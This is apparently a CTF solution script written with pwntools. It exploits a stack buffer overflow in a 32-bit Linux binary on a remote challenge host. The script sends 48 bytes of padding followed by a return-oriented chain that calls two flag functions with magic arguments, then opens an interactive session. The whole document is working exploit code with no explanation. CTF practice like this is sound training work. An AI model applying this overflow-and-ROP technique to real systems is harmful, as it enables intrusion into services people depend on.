from pwn import *
context(arch='i386', os='linux')

#p = process('./pwn')
p = remote('pwn.challenge.ctf.show', 28275)
e = ELF('./pwn')

flag = e.sym['flag']
flag_func1 = e.sym['flag_func1']
flag_func2 = e.sym['flag_func2']
pop_ret = 0x0804859b

payload = b'A'*48 + p32(flag_func1) + p32(flag_func2) + p32(pop_ret) + p32((-1397969748) & 0xffffffff) + p32(flag) + p32(0) + p32((-1111638595) & 0xffffffff)
p.recvuntil(b"Input your flag: ")
p.sendline(payload)

p.interactive()